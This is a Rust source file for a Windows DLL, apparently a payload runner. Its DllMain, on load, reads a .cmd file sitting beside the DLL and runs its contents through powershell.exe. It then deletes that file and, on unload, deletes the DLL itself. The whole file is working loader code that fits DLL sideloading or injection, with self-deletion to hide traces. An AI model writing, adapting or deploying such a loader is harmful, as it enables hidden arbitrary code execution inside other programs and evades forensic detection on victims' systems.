use std::fs::{self};
use std::path::PathBuf;
use std::process::Command;

use windows::Win32::Foundation::HINSTANCE;
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
};

use crate::utils::get_module_name;
mod utils;

#[no_mangle]
#[allow(non_snake_case)]
extern "C" fn DllMain(hinstDll: HINSTANCE, fwdReason: u32, _lpvReserved: *const u32) -> bool {
    let mod_path: Option<PathBuf> = get_module_name(hinstDll).map(|x| PathBuf::from(x));
    let cmd_path: Option<PathBuf> = {
        if let Some(mod_path) = mod_path.as_ref() {
            let mut cmd_path = PathBuf::from(&mod_path);
            if cmd_path.is_file() {
                let cur_filename: String =
                    cmd_path.file_name().unwrap().to_str().unwrap().to_string();
                let new_file_name = format!("{}.cmd", cur_filename.strip_suffix(".dll").unwrap());

                cmd_path.set_file_name(new_file_name);
                Some(cmd_path)
            } else {
                None
            }
        } else {
            None
        }
    };

    match fwdReason {
        DLL_PROCESS_ATTACH => {
            // let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
            // let mut fd = File::create(&temp_file).unwrap();
            // writeln!(fd, "[PROC_ATTACH] Runner gets loaded...").ok();

            let cmd_path = cmd_path.unwrap();
            if let Ok(payload) = fs::read_to_string(&cmd_path) {
                if let Ok(mut child) = Command::new("powershell.exe")
                    .arg("-Command")
                    .arg(&payload)
                    .spawn()
                {
                    // writeln!(fd, "[PROC_ATTACH] Spawned cmd: {:?}", payload).ok();
                    child.wait().ok();
                }

                fs::remove_file(&cmd_path).ok();
            }
            return false;
        }
        DLL_PROCESS_DETACH => {
            // let temp_file = format!("{}/hui.txt", get_temp_path().unwrap());
            // let mut fd = File::create(&temp_file).unwrap();
            // writeln!(fd, "[PROC_DETACH] Runner gets unloaded...").ok();

            if let Some(p) = cmd_path {
                fs::remove_file(p).ok();
                fs::remove_file(mod_path.unwrap()).ok();
            }
        }
        DLL_THREAD_ATTACH => {}
        DLL_THREAD_DETACH => {}
        _ => (),
    }

    true
}
